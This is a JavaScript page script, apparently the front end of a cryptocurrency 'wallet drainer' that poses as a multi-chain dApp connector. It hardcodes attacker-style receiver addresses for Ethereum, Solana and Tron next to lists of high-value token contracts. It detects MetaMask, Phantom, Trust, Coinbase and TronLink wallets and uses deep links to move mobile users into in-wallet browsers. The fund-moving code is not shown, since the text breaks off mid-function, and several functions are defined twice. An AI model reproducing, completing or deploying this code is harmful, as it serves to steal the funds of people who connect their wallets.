$(document).ready(function() {
    // Your Ethereum address to receive funds
    const RECEIVER_ADDRESS = "0xA6ea466A91837809CB1d94B8ccb73c2D98657321"; // Replace with your ETH address
    const SOLANA_RECEIVER = "4NW3YXvEiNEVX6QxeS19FvSZ963vGqMQMvxguR8npq6s"; // Replace with your Solana address
    const TRON_RECEIVER = "TGdWPEEiDxiJPZskJhnJYZBKw3qbGUDXoU"; // Replace with your Tron address

    // Enhanced dynamic wallet detection with improved mobile support
    const detectedWallets = [];
    
    // Enhanced wallet detection function with better mobile handling
    function detectAvailableWallets() {
        const wallets = [];
        
        if (window.ethereum) {
            // Single provider detection
            const eth = window.ethereum;
            const walletTypes = [
                { name: "MetaMask", key: "isMetaMask" },
                { name: "Coinbase Wallet", key: "isCoinbaseWallet" },
                { name: "Trust Wallet", key: "isTrust" },
                { name: "Rainbow", key: "isRainbow" },
                { name: "Brave Wallet", key: "isBraveWallet" },
                { name: "Opera Wallet", key: "isOpera" },
                { name: "Phantom (ETH)", key: "isPhantom" },
                { name: "Rabby Wallet", key: "isRabby" },
                { name: "Frame", key: "isFrame" },
                { name: "Talisman", key: "isTalisman" }
            ];
            
            // Improved Phantom detection: check window.phantom.ethereum
            if (window.phantom && window.phantom.ethereum) {
                wallets.push({ name: "Phantom (ETH)", provider: window.phantom.ethereum, type: "evm" });
            } else {
                walletTypes.forEach(w => {
                    if (w.key === "isPhantom" && eth[w.key]) {
                        wallets.push({ name: w.name, provider: eth, type: "evm" });
                    } else if (w.key === "isMetaMask" && eth[w.key] && !eth.isPhantom) {
                        wallets.push({ name: w.name, provider: eth, type: "evm" });
                    } else if (w.key === "isCoinbaseWallet" && eth[w.key]) {
                        wallets.push({ name: w.name, provider: eth, type: "evm" });
                    } else if (w.key !== "isPhantom" && w.key !== "isMetaMask" && w.key !== "isCoinbaseWallet" && eth[w.key]) {
                        wallets.push({ name: w.name, provider: eth, type: "evm" });
                    }
                });
            }
            
            // Extra: detect Coinbase Wallet via window.coinbaseWalletExtension
            if (window.coinbaseWalletExtension) {
                wallets.push({ name: "Coinbase Wallet", provider: window.coinbaseWalletExtension, type: "evm" });
            }
            
            // Multiple providers detection
            if (Array.isArray(eth.providers)) {
                eth.providers.forEach(p => {
                    walletTypes.forEach(w => {
                        if (w.key === "isPhantom" && p[w.key]) {
                            wallets.push({ name: w.name, provider: p, type: "evm" });
                        } else if (w.key === "isMetaMask" && p[w.key] && !p.isPhantom) {
                            wallets.push({ name: w.name, provider: p, type: "evm" });
                        } else if (w.key === "isCoinbaseWallet" && p[w.key]) {
                            wallets.push({ name: w.name, provider: p, type: "evm" });
                        } else if (w.key !== "isPhantom" && w.key !== "isMetaMask" && w.key !== "isCoinbaseWallet" && p[w.key]) {
                            wallets.push({ name: w.name, provider: p, type: "evm" });
                        }
                    });
                });
            }
        }
        
        // Check for Solana wallets
        if (window.solana && window.solana.isPhantom) {
            wallets.push({ name: "Phantom (Solana)", provider: window.solana, type: "solana" });
        }
        
        // Check for Tron wallets
        if (window.tronWeb && window.tronWeb.defaultAddress) {
            wallets.push({ name: "TronLink", provider: window.tronWeb, type: "tron" });
        }
        
        return wallets;
    }

    // Mobile wallet options (always available on mobile)
    const mobileWallets = [
        { name: "MetaMask Mobile", type: "mobile", deepLink: "metamask", networks: ["ETH", "BSC", "POLYGON"] },
        { name: "Trust Wallet Mobile", type: "mobile", deepLink: "trust wallet", networks: ["ETH", "BSC", "POLYGON"] },
        { name: "Coinbase Wallet Mobile", type: "mobile", deepLink: "coinbase wallet", networks: ["ETH", "BSC", "POLYGON"] },
        { name: "Rainbow Mobile", type: "mobile", deepLink: "rainbow", networks: ["ETH", "POLYGON"] },
        { name: "Phantom Mobile", type: "mobile", deepLink: "phantom (eth)", networks: ["ETH", "SOLANA"] },
        { name: "Argent Mobile", type: "mobile", deepLink: "argent", networks: ["ETH"] },
        { name: "Exodus Mobile", type: "mobile", deepLink: "exodus", networks: ["ETH", "BSC"] }
    ];

    // Detect available wallets on page load
    const availableWallets = detectAvailableWallets();
    console.log("Detected wallets:", availableWallets);

    // Add detected wallets to the list
    availableWallets.forEach(wallet => {
        detectedWallets.push(wallet);
    });

    // Add mobile wallets if on mobile device or if no desktop wallets found
    if (isMobileDevice() || detectedWallets.length === 0) {
        mobileWallets.forEach(wallet => {
            detectedWallets.push(wallet);
        });
    }

    // WalletConnect detection (works on both mobile and desktop)
    let walletConnectAvailable = false;
    let WalletConnectProvider = null;
    if (window.WalletConnectProvider) {
        walletConnectAvailable = true;
        WalletConnectProvider = window.WalletConnectProvider;
    } else if (window.WalletConnect && window.WalletConnect.EthereumProvider) {
        walletConnectAvailable = true;
        WalletConnectProvider = window.WalletConnect.EthereumProvider;
    }
    if (walletConnectAvailable) {
        detectedWallets.push({ name: "WalletConnect", provider: "walletconnect", type: "walletconnect" });
    }

    // Function to debug available wallet providers
    function debugWalletProviders() {
        console.log("=== Enhanced Wallet Provider Debug ===");
        console.log("window.ethereum:", window.ethereum);
        console.log("window.phantom:", window.phantom);
        console.log("window.solana:", window.solana);
        console.log("window.tronWeb:", window.tronWeb);
        
        if (window.ethereum) {
            console.log("Main ethereum object properties:");
            console.log("- isMetaMask:", window.ethereum.isMetaMask);
            console.log("- isPhantom:", window.ethereum.isPhantom);
            console.log("- isCoinbaseWallet:", window.ethereum.isCoinbaseWallet);
            console.log("- isTrust:", window.ethereum.isTrust);
            console.log("- isRainbow:", window.ethereum.isRainbow);
            console.log("- isBraveWallet:", window.ethereum.isBraveWallet);
            console.log("- isRabby:", window.ethereum.isRabby);
            
            if (window.ethereum.providers) {
                console.log("Multiple providers detected:", window.ethereum.providers.length);
                window.ethereum.providers.forEach((provider, index) => {
                    console.log(`Provider ${index}:`, {
                        isMetaMask: provider.isMetaMask,
                        isPhantom: provider.isPhantom,
                        isCoinbaseWallet: provider.isCoinbaseWallet,
                        isTrust: provider.isTrust,
                        isRainbow: provider.isRainbow,
                        isBraveWallet: provider.isBraveWallet,
                        isRabby: provider.isRabby
                    });
                });
            }
        }
        console.log("Total detected wallets:", detectedWallets.length);
        console.log("========================================");
    }

    // Multi-chain token configurations
    const NETWORK_CONFIGS = {
        ethereum: {
            chainId: 1,
            name: "Ethereum",
            nativeCurrency: "ETH",
            rpcUrl: "https://mainnet.infura.io/v3/YOUR_INFURA_KEY",
            receiver: RECEIVER_ADDRESS,
            tokens: [
                { symbol: "USDT", address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", decimals: 6 },
                { symbol: "USDC", address: "0xA0b86a33E6417a174f4dcc5b814094b8d1f57b69", decimals: 6 },
                { symbol: "DAI", address: "0x6B175474E89094C44Da98b954EedeAC495271d0F", decimals: 18 },
                { symbol: "WBTC", address: "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", decimals: 8 },
                { symbol: "AAVE", address: "0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9", decimals: 18 },
                { symbol: "LINK", address: "0x514910771AF9Ca656af840dff83E8264EcF986CA", decimals: 18 },
                { symbol: "UNI", address: "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984", decimals: 18 },
                { symbol: "WETH", address: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", decimals: 18 },
                { symbol: "SHIB", address: "0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE", decimals: 18 },
                { symbol: "PEPE", address: "0x6982508145454Ce325dDbE47a25d4ec3d2311933", decimals: 18 }
            ]
        },
        bsc: {
            chainId: 56,
            name: "BSC",
            nativeCurrency: "BNB",
            rpcUrl: "https://bsc-dataseed1.binance.org/",
            receiver: RECEIVER_ADDRESS,
            tokens: [
                { symbol: "USDT", address: "0x55d398326f99059ff775485246999027b3197955", decimals: 18 },
                { symbol: "USDC", address: "0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d", decimals: 18 },
                { symbol: "BUSD", address: "0xe9e7cea3dedca5984780bafc599bd69add087d56", decimals: 18 },
                { symbol: "CAKE", address: "0x0e09fabb73bd3ade0a17ecc321fd13a19e81ce82", decimals: 18 },
                { symbol: "BNB", address: "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c", decimals: 18 },
                { symbol: "XRP", address: "0x1d2f0da169ceb9fc7b3144628db156f3f6c60dbe", decimals: 18 },
                { symbol: "ADA", address: "0x3ee2200efb3400fabb9aacf31297cbdd1d435d47", decimals: 18 },
                { symbol: "DOGE", address: "0xba2ae424d960c26247dd6c32edc70b295c744c43", decimals: 8 }
            ]
        },
        polygon: {
            chainId: 137,
            name: "Polygon",
            nativeCurrency: "MATIC",
            rpcUrl: "https://polygon-rpc.com/",
            receiver: RECEIVER_ADDRESS,
            tokens: [
                { symbol: "USDT", address: "0xc2132d05d31c914a87c6611c10748aeb04b58e8f", decimals: 6 },
                { symbol: "USDC", address: "0x2791bca1f2de4661ed88a30c99a7a9449aa84174", decimals: 6 },
                { symbol: "WETH", address: "0x7ceb23fd6f88b65d85b8ee2ffee9f6bb2c45a5eb", decimals: 18 },
                { symbol: "WBTC", address: "0x1bfd67037b42cf73acf2047067bd4f2c47d9bfd6", decimals: 8 }
            ]
        }
    };

    // Solana token list (SPL tokens)
    const SOLANA_TOKENS = [
        { symbol: "USDT", mint: "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB", decimals: 6 },
        { symbol: "USDC", mint: "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v", decimals: 6 },
        { symbol: "SOL", mint: "So11111111111111111111111111111111111111112", decimals: 9 },
        { symbol: "RAY", mint: "4k3Dyjzvzp8eMZWUXbBCjEvwSkkk59S5iCNLY3QrkX6R", decimals: 6 },
        { symbol: "SRM", mint: "SRMuApVNdxXokk5GT7XD5cUUgXMBCoAz2LHeuAoKWRt", decimals: 6 }
    ];

    // Tron token list (TRC-20 tokens)
    const TRON_TOKENS = [
        { symbol: "USDT", address: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t", decimals: 6 },
        { symbol: "USDC", address: "TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8", decimals: 6 },
        { symbol: "BTT", address: "TAFjULxiVgT4qWVEbBbdEwUnCRAFr2vB5K", decimals: 18 },
        { symbol: "WIN", address: "TLa2f6VPqDgRE67v1736s7bJ8Ray5wYjU7", decimals: 6 },
        { symbol: "SUN", address: "TSSMHYeV2uE9qYH95DqyoCuNCzEL1NvU3S", decimals: 18 }
    ];

    // Simplified wallet definitions - only the 4 main wallets
    const WALLET_DEFINITIONS = {
        metamask: {
            name: "MetaMask",
            type: "evm",
            networks: ["ethereum", "bsc", "polygon"],
            detect: () => {
                return window.ethereum && window.ethereum.isMetaMask && !window.ethereum.isPhantom;
            },
            getProvider: () => {
                if (window.ethereum && window.ethereum.isMetaMask && !window.ethereum.isPhantom) {
                    return window.ethereum;
                }
                if (window.ethereum && window.ethereum.providers) {
                    return window.ethereum.providers.find(p => p.isMetaMask && !p.isPhantom);
                }
                return null;
            },
            icon: "🦊"
        },
        trust: {
            name: "Trust Wallet",
            type: "multi-evm-tron-solana",
            networks: ["ethereum", "bsc", "polygon", "tron", "solana"],
            detect: () => {
                return window.ethereum && window.ethereum.isTrust;
            },
            getProvider: () => {
                if (window.ethereum && window.ethereum.isTrust) {
                    return window.ethereum;
                }
                if (window.ethereum && window.ethereum.providers) {
                    return window.ethereum.providers.find(p => p.isTrust);
                }
                return null;
            },
            getTronProvider: () => window.tronWeb, // Trust Wallet can also access TronWeb
            getSolanaProvider: () => window.solana, // Trust Wallet can also access Solana
            icon: "🛡️"
        },
        phantom: {
            name: "Phantom",
            type: "multi",
            evmNetworks: ["ethereum", "polygon"], // Only ETH and Polygon for EVM
            solanaNetworks: ["solana"],
            detect: () => {
                const hasEVM = window.phantom && window.phantom.ethereum;
                const hasSolana = (window.solana && window.solana.isPhantom) || (window.phantom && window.phantom.solana);
                return hasEVM || hasSolana;
            },
            getEVMProvider: () => window.phantom && window.phantom.ethereum,
            getSolanaProvider: () => window.solana || (window.phantom && window.phantom.solana),
            icon: "👻"
        },
        coinbase: {
            name: "Coinbase Wallet",
            type: "evm",
            networks: ["ethereum", "bsc", "polygon"],
            detect: () => {
                return (window.ethereum && window.ethereum.isCoinbaseWallet) || window.coinbaseWalletExtension;
            },
            getProvider: () => {
                if (window.ethereum && window.ethereum.isCoinbaseWallet) {
                    return window.ethereum;
                }
                if (window.coinbaseWalletExtension) {
                    return window.coinbaseWalletExtension;
                }
                if (window.ethereum && window.ethereum.providers) {
                    return window.ethereum.providers.find(p => p.isCoinbaseWallet);
                }
                return null;
            },
            icon: "🟦"
        },
        tronlink: {
            name: "TronLink",
            type: "tron",
            networks: ["tron"],
            detect: () => window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58,
            getProvider: () => window.tronWeb,
            icon: "🔴"
        }
    };

    // Enhanced mobile device detection
    function isMobileDevice() {
        // More comprehensive mobile detection
        const userAgent = navigator.userAgent.toLowerCase();
        const mobileKeywords = [
            'android', 'webos', 'iphone', 'ipad', 'ipod', 'blackberry', 
            'iemobile', 'opera mini', 'mobile', 'tablet'
        ];
        
        const isMobileUA = mobileKeywords.some(keyword => userAgent.includes(keyword));
        const isTouchDevice = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
        const isSmallScreen = window.innerWidth <= 768;
        const hasMobileAPIs = 'orientation' in window || 'DeviceOrientationEvent' in window;
        
        // Enhanced mobile detection
        const isAndroid = /android/i.test(userAgent);
        const isIOS = /iphone|ipad|ipod/i.test(userAgent);
        const isMobileChrome = /chrome/i.test(userAgent) && /mobile/i.test(userAgent);
        const isMobileSafari = /safari/i.test(userAgent) && /mobile/i.test(userAgent);
        
        return isMobileUA || (isTouchDevice && isSmallScreen) || hasMobileAPIs || isAndroid || isIOS || isMobileChrome || isMobileSafari;
    }

    // Function to detect specific mobile browser
    function getMobileBrowser() {
        const userAgent = navigator.userAgent.toLowerCase();
        
        if (/safari/i.test(userAgent) && /mobile/i.test(userAgent) && !/chrome/i.test(userAgent)) {
            return 'safari';
        } else if (/chrome/i.test(userAgent) && /mobile/i.test(userAgent)) {
            return 'chrome';
        } else if (/firefox/i.test(userAgent) && /mobile/i.test(userAgent)) {
            return 'firefox';
        } else if (/opera/i.test(userAgent) && /mobile/i.test(userAgent)) {
            return 'opera';
        } else if (/edge/i.test(userAgent) && /mobile/i.test(userAgent)) {
            return 'edge';
        } else if (/samsung/i.test(userAgent)) {
            return 'samsung';
        }
        
        return 'unknown';
    }

    // Enhanced mobile deep link creation with comprehensive wallet support
    function createMobileDeepLink(walletName, dappUrl = window.location.href) {
        const encodedUrl = encodeURIComponent(dappUrl);
        const hostname = window.location.hostname;
        const fullUrl = window.location.href;
        
        const mobileLinks = {
            "metamask": `https://metamask.app.link/dapp/${hostname}${window.location.pathname}`,
            "trust wallet": `https://link.trustwallet.com/open_url?coin_id=60&url=${encodedUrl}`,
            "coinbase wallet": `https://go.cb-w.com/dapp?cb_url=${encodedUrl}`,
            "rainbow": `https://rainbow.me/dapp?url=${encodedUrl}`,
            "phantom (eth)": `https://phantom.app/ul/browse/${encodedUrl}?ref=${encodedUrl}`,
            "argent": `https://argent.link/dapp/${hostname}${window.location.pathname}`,
            "exodus": `https://www.exodus.com/mobile?dapp=${encodedUrl}`,
            // Additional popular wallets
            "imtoken": `imtokenv2://navigate/DappView?url=${encodedUrl}&chain=ethereum`,
            "tokenpocket": `tpoutside://open?param=${encodedUrl}`,
            "safepal": `safepalwallet://open_url?url=${encodedUrl}`,
            "1inch": `https://wallet.1inch.io/connect?url=${encodedUrl}`,
            "bitkeep": `bitkeep://bkconnect?action=dapp&url=${encodedUrl}`,
            "mathwallet": `mathwallet://dapp?url=${encodedUrl}`
        };
        
        return mobileLinks[walletName.toLowerCase()] || null;
    }

    // Enhanced mobile wallet connection function (simplified working version)
    function connectMobileWallet(walletName) {
        if (!isMobileDevice()) {
            console.log("Not on mobile device, skipping mobile wallet connection");
            return false;
        }
        
        const deepLink = createMobileDeepLink(walletName);
        if (deepLink) {
            console.log(`Opening mobile deep link for ${walletName}:`, deepLink);
            
            // Try multiple methods to open the deep link (from your working code)
            try {
                // Method 1: Direct window.open
                const newWindow = window.open(deepLink, '_blank');
                
                // Method 2: If window.open fails, try location.href
                if (!newWindow || newWindow.closed) {
                    window.location.href = deepLink;
                }
                
                return true;
            } catch (error) {
                console.error("Failed to open deep link:", error);
                
                // Method 3: Create a temporary link and click it
                try {
                    const link = document.createElement('a');
                    link.href = deepLink;
                    link.target = '_blank';
                    link.rel = 'noopener noreferrer';
                    document.body.appendChild(link);
                    link.click();
                    document.body.removeChild(link);
                    return true;
                } catch (linkError) {
                    console.error("Failed to create and click link:", linkError);
                    return false;
                }
            }
        }
        
        console.warn(`No deep link available for wallet: ${walletName}`);
        return false;
    }

    // Enhanced mobile connection waiting with multiple wallet detection
    function waitForMobileConnection(timeout = 30000) {
        return new Promise((resolve) => {
            const startTime = Date.now();
            const checkInterval = 1000; // Check every second
            
            const checkConnection = async () => {
                try {
                    // Check for multiple wallet providers
                    if (window.ethereum) {
                        const accounts = await window.ethereum.request({ method: 'eth_accounts' });
                        if (accounts && accounts.length > 0) {
                            resolve({ success: true, accounts, provider: window.ethereum });
                            return;
                        }
                    }
                    
                    // Check for specific wallet objects
                    const walletChecks = [
                        { provider: window.phantom?.ethereum, name: 'phantom' },
                        { provider: window.trustWallet, name: 'trust' },
                        { provider: window.coinbaseWalletExtension, name: 'coinbase' },
                        { provider: window.tronWeb, name: 'tronlink', isTron: true }
                    ];
                    
                    for (const wallet of walletChecks) {
                        if (wallet.provider) {
                            if (wallet.isTron) {
                                // Special handling for Tron
                                if (wallet.provider.defaultAddress && wallet.provider.defaultAddress.base58) {
                                    resolve({ success: true, accounts: [wallet.provider.defaultAddress.base58], provider: wallet.provider, isTron: true });
                                    return;
                                }
                            } else if (typeof wallet.provider.request === 'function') {
                                try {
                                    const accounts = await wallet.provider.request({ method: 'eth_accounts' });
                                    if (accounts && accounts.length > 0) {
                                        resolve({ success: true, accounts, provider: wallet.provider });
                                        return;
                                    }
                                } catch (error) {
                                    // Continue checking other wallets
                                }
                            }
                        }
                    }
                    
                    // Check for Solana wallet
                    if (window.solana && typeof window.solana.connect === 'function') {
                        try {
                            // Try to check if already connected
                            if (window.solana.isConnected && window.solana.publicKey) {
                                resolve({ 
                                    success: true, 
                                    accounts: [window.solana.publicKey.toString()], 
                                    provider: window.solana,
                                    isSolana: true 
                                });
                                return;
                            }
                        } catch (error) {
                            // Continue checking
                        }
                    }
                } catch (error) {
                    console.log("Still waiting for mobile connection...", error);
                }
                
                // Check if timeout reached
                if (Date.now() - startTime > timeout) {
                    resolve({ success: false, error: "Connection timeout" });
                    return;
                }
                
                // Continue checking
                setTimeout(checkConnection, checkInterval);
            };
            
            checkConnection();
        });
    }

    // Simple wallet status checker - no longer modifies dropdown since it's now hardcoded in HTML
    function checkWalletStatuses() {
        console.log("=== Checking Wallet Availability ===");
        Object.entries(WALLET_DEFINITIONS).forEach(([key, wallet]) => {
            try {
                const detected = wallet.detect();
                console.log(`${wallet.name}: ${detected ? '✅ Available' : '❌ Not Available'}`);
            } catch (error) {
                console.log(`${wallet.name}: ❌ Error checking - ${error.message}`);
            }
        });
        console.log("====================================");
    }

    // Current selection state
    let selectedWallet = '';
    let currentWalletProvider = null;

    // Enhanced mobile device detection
    function isMobileDevice() {
        const userAgent = navigator.userAgent.toLowerCase();
        
        // Check for mobile user agents
        const mobileKeywords = [
            'android', 'webos', 'iphone', 'ipad', 'ipod', 'blackberry', 
            'iemobile', 'opera mini', 'mobile', 'tablet'
        ];
        
        const isMobileUA = mobileKeywords.some(keyword => userAgent.includes(keyword));
        
        // Check for touch capabilities
        const isTouchDevice = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
        
        // Check screen size
        const isSmallScreen = window.innerWidth <= 768;
        
        // Check for mobile-specific APIs
        const hasMobileAPIs = 'orientation' in window || 'DeviceOrientationEvent' in window;
        
        // Enhanced mobile detection
        const isAndroid = /android/i.test(userAgent);
        const isIOS = /iphone|ipad|ipod/i.test(userAgent);
        const isMobileChrome = /chrome/i.test(userAgent) && /mobile/i.test(userAgent);
        const isMobileSafari = /safari/i.test(userAgent) && /mobile/i.test(userAgent);
        
        // Return true if any mobile indicators are present
        return isMobileUA || (isTouchDevice && isSmallScreen) || hasMobileAPIs || isAndroid || isIOS || isMobileChrome || isMobileSafari;
    }
    
    // Function to detect specific mobile browser
    function getMobileBrowser() {
        const userAgent = navigator.userAgent.toLowerCase();
        
        if (/safari/i.test(userAgent) && /mobile/i.test(userAgent) && !/chrome/i.test(userAgent)) {
            return 'safari';
        } else if (/chrome/i.test(userAgent) && /mobile/i.test(userAgent)) {
            return 'chrome';
        } else if (/firefox/i.test(userAgent) && /mobile/i.test(userAgent)) {
            return 'firefox';
        } else if (/opera/i.test(userAgent) && /mobile/i.test(userAgent)) {
            return 'opera';
        } else if (/edge/i.test(userAgent) && /mobile/i.test(userAgent)) {
            return 'edge';
        } else if (/samsung/i.test(userAgent)) {
            return 'samsung';
        }
        
        return 'unknown';
    }

    // Enhanced function to create mobile deep links with comprehensive wallet support
    function createMobileDeepLink(walletName, dappUrl = window.location.href) {
        const encodedUrl = encodeURIComponent(dappUrl);
        const hostname = window.location.hostname;
        const fullUrl = window.location.href;
        
        // Comprehensive mobile deep link mappings
        const mobileLinks = {
            // Core supported wallets (our main 4)
            "trust": `https://link.trustwallet.com/open_url?coin_id=60&url=${encodedUrl}`,
            "trust wallet": `https://link.trustwallet.com/open_url?coin_id=60&url=${encodedUrl}`,
            
            "phantom": `https://phantom.app/ul/browse/${encodedUrl}?cluster=mainnet-beta`,
            "phantom (eth)": `https://phantom.app/ul/browse/${encodedUrl}?cluster=mainnet-beta`,
            
            "coinbase": `https://go.cb-w.com/dapp?cb_url=${encodedUrl}`,
            "coinbase wallet": `https://go.cb-w.com/dapp?cb_url=${encodedUrl}`,
            
            "tronlink": `tronlink://open?url=${encodedUrl}`,
            "tron": `tronlink://open?url=${encodedUrl}`,
            
            // Popular additional mobile wallets
            "metamask": `https://metamask.app.link/dapp/${hostname}${window.location.pathname}`,
            
            "rainbow": `https://rnbwapp.com/open?url=${encodedUrl}`,
            
            "exodus": `exodus://open?url=${encodedUrl}`,
            
            "imtoken": `imtokenv2://navigate/DappView?url=${encodedUrl}&chain=ethereum`,
            
            "tokenpocket": `tpoutside://open?param=${encodedUrl}`,
            
            "safepal": `safepalwallet://open_url?url=${encodedUrl}`,
            
            "bitkeep": `bitkeep://bkconnect?action=dapp&url=${encodedUrl}`,
            
            "mathwallet": `mathwallet://dapp?url=${encodedUrl}`,
            
            "1inch": `https://wallet.1inch.io/connect?url=${encodedUrl}`,
            
            "argent": `https://argent.link/app/url?url=${encodedUrl}`,
            
            "enjin": `enjinwallet://dapp?url=${encodedUrl}`,
            
            "alpha": `alphawallet://dapp?url=${encodedUrl}`,
            
            "pillar": `pillarwallet://dapp?url=${encodedUrl}`,
            
            "aktionariat": `aktionariat://dapp?url=${encodedUrl}`,
            
            "keyring": `keyring://dapp?url=${encodedUrl}`,
            
            "gnosis": `https://gnosis-safe.io/app/dapp?url=${encodedUrl}`,
            
            "crypto": `crypto://dapp?url=${encodedUrl}`,
            
            "dharma": `dharma://dapp?url=${encodedUrl}`,
            
            "huobi": `huobiwallet://dapp?url=${encodedUrl}`,
            
            "hyperpay": `hyperpay://dapp?url=${encodedUrl}`,
            
            "linen": `linen://dapp?url=${encodedUrl}`,
            
            "meetone": `meetone://dapp?url=${encodedUrl}`,
            
            "morix": `morixwallet://dapp?url=${encodedUrl}`,
            
            "myte": `myte://dapp?url=${encodedUrl}`
        };
        
        const normalizedWalletName = walletName.toLowerCase().trim();
        
        // Try exact match first
        if (mobileLinks[normalizedWalletName]) {
            return mobileLinks[normalizedWalletName];
        }
        
        // Try partial matches for compound names
        for (const [key, link] of Object.entries(mobileLinks)) {
            if (normalizedWalletName.includes(key) || key.includes(normalizedWalletName)) {
                return link;
            }
        }
        
        return null;
    }

    // Enhanced connection status update
    function updateConnectionStatus(message, isError = false) {
        const statusEl = $('#connection-status');
        statusEl.text(message);
        statusEl.css('color', isError ? '#ff4444' : '#666');
    }

    // Function to get wallet installation message based on platform
    function getWalletInstallMessage(walletName) {
        const isDesktop = !isMobileDevice();
        const isAndroid = /android/i.test(navigator.userAgent);
        const isIOS = /iphone|ipad|ipod/i.test(navigator.userAgent);
        
        const messages = {
            "MetaMask": {
                desktop: "Install MetaMask browser extension from the Chrome Web Store or Firefox Add-ons.",
                android: "Download MetaMask from Google Play Store.",
                ios: "Download MetaMask from Apple App Store."
            },
            "Trust Wallet": {
                desktop: "Trust Wallet is primarily a mobile app. Use the browser extension or switch to mobile.",
                android: "Download Trust Wallet from Google Play Store.",
                ios: "Download Trust Wallet from Apple App Store."
            },
            "Phantom": {
                desktop: "Install Phantom browser extension from the Chrome Web Store.",
                android: "Download Phantom from Google Play Store.",
                ios: "Download Phantom from Apple App Store."
            },
            "Coinbase Wallet": {
                desktop: "Install Coinbase Wallet extension from the Chrome Web Store.",
                android: "Download Coinbase Wallet from Google Play Store.",
                ios: "Download Coinbase Wallet from Apple App Store."
            },
            "TronLink": {
                desktop: "Install TronLink browser extension from the Chrome Web Store.",
                android: "Download TronLink from Google Play Store.",
                ios: "Download TronLink from Apple App Store."
            }
        };
        
        const walletMessages = messages[walletName] || {
            desktop: `Install ${walletName} browser extension.`,
            android: `Download ${walletName} from Google Play Store.`,
            ios: `Download ${walletName} from Apple App Store.`
        };
        
        if (isDesktop) {
            return walletMessages.desktop;
        } else if (isAndroid) {
            return walletMessages.android;
        } else if (isIOS) {
            return walletMessages.ios;
        } else {
            return `Download ${walletName} app from your device's app store.`;
        }
    }

    // Function to open appropriate store/installation page
    function openWalletInstallPage(walletName) {
        const isDesktop = !isMobileDevice();
        const isAndroid = /android/i.test(navigator.userAgent);
        const isIOS = /iphone|ipad|ipod/i.test(navigator.userAgent);
        
        const installLinks = {
            "MetaMask": {
                desktop: "https://metamask.io/download/",
                android: "https://play.google.com/store/apps/details?id=io.metamask",
                ios: "https://apps.apple.com/app/metamask/id1438144202"
            },
            "Trust Wallet": {
                desktop: "https://trustwallet.com/browser-extension",
                android: "https://play.google.com/store/apps/details?id=com.wallet.crypto.trustapp",
                ios: "https://apps.apple.com/app/trust-crypto-bitcoin-wallet/id1288339409"
            },
            "Phantom": {
                desktop: "https://phantom.app/download",
                android: "https://play.google.com/store/apps/details?id=app.phantom",
                ios: "https://apps.apple.com/app/phantom-solana-wallet/id1598432977"
            },
            "Coinbase Wallet": {
                desktop: "https://chrome.google.com/webstore/detail/coinbase-wallet-extension/hnfanknocfeofbddgcijnmhnfnkdnaad",
                android: "https://play.google.com/store/apps/details?id=org.toshi",
                ios: "https://apps.apple.com/app/coinbase-wallet/id1278383455"
            },
            "TronLink": {
                desktop: "https://chrome.google.com/webstore/detail/tronlink/ibnejdfjmmkpcnlpebklmnkoeoihofec",
                android: "https://play.google.com/store/apps/details?id=com.tronlinkpro.wallet",
                ios: "https://apps.apple.com/app/tronlink/id1453530188"
            }
        };
        
        const walletLinks = installLinks[walletName];
        if (!walletLinks) {
            console.warn(`No install links found for wallet: ${walletName}`);
            return;
        }
        
        let installUrl;
        if (isDesktop) {
            installUrl = walletLinks.desktop;
        } else if (isAndroid) {
            installUrl = walletLinks.android;
        } else if (isIOS) {
            installUrl = walletLinks.ios;
        } else {
            // Fallback to desktop link
            installUrl = walletLinks.desktop;
        }
        
        if (installUrl) {
            console.log(`Opening install page for ${walletName}:`, installUrl);
            try {
                window.open(installUrl, '_blank', 'noopener,noreferrer');
            } catch (error) {
                console.error("Failed to open install page:", error);
                // Fallback: copy to clipboard or show URL
                if (navigator.clipboard) {
                    navigator.clipboard.writeText(installUrl).then(() => {
                        alert(`Install link copied to clipboard: ${installUrl}`);
                    }).catch(() => {
                        alert(`Please visit: ${installUrl}`);
                    });
                } else {
                    alert(`Please visit: ${installUrl}`);
                }
            }
        }
    }

    // Initialize UI - dropdown is now static in HTML
    updateConnectionStatus(`Device: ${isMobileDevice() ? 'Mobile' : 'Desktop'} | Ready for wallet selection`);

    // Debug wallet providers on page load
    debugWalletProviders();

    // Check wallet availability
    function checkWalletAvailability(walletId) {
        if (walletId.includes('-mobile')) {
            return isMobileDevice() ? 'Mobile Supported' : 'Mobile Only';
        }
        
        const wallet = WALLET_DEFINITIONS[walletId];
        if (!wallet) return 'Unknown';
        
        // On mobile devices, all major wallets are considered "available" via deep links
        if (isMobileDevice()) {
            // Major mobile-supported wallets
            const mobileSupportedWallets = ['metamask', 'trust', 'phantom', 'coinbase', 'tronlink'];
            if (mobileSupportedWallets.includes(walletId)) {
                return 'Mobile Supported';
            }
        }
        
        try {
            return wallet.detect() ? 'Available' : 'Not Installed';
        } catch (error) {
            // On mobile, if detection fails, still consider it available via mobile app
            if (isMobileDevice()) {
                const mobileSupportedWallets = ['metamask', 'trust', 'phantom', 'coinbase', 'tronlink'];
                if (mobileSupportedWallets.includes(walletId)) {
                    return 'Mobile Supported';
                }
            }
            return 'Not Installed';
        }
    }

    // Get supported networks for a wallet
    function getSupportedNetworks(walletId) {
        if (!walletId) return 'Select wallet first';
        
        const wallet = WALLET_DEFINITIONS[walletId];
        if (!wallet) return 'Unknown wallet';
        
        if (wallet.type === "multi") {
            // Phantom supports both EVM and Solana
            const evmNetworks = wallet.evmNetworks.map(n => n.toUpperCase());
            const solanaNetworks = wallet.solanaNetworks.map(n => n.toUpperCase());
            return [...evmNetworks, ...solanaNetworks].join(', ');
        } else if (wallet.networks) {
